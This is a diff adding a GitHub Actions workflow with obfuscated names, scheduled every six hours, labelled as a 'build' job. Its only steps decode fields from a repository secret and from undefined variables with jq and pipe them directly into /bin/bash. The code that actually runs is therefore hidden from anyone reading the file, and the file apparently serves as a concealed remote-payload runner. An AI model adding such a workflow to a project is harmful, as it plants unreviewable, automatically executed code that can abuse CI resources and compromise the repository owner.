@@ -1,0 +1,19 @@
+name: durufei6718
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '31 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: durufei6718
+        env:
+          vc7491: ${{ secrets.vc7491 }}
+        run: |
+          echo $vc7491 | jq -r .y76742 | /bin/bash
+          echo $gugjk55022 | jq -r .jlzt90930 | /bin/bash
+          echo $bqojw2514 | jq -r .z36 | /bin/bash
+          echo $chwqa42 | jq -r .muchw77285 | /bin/bash
+
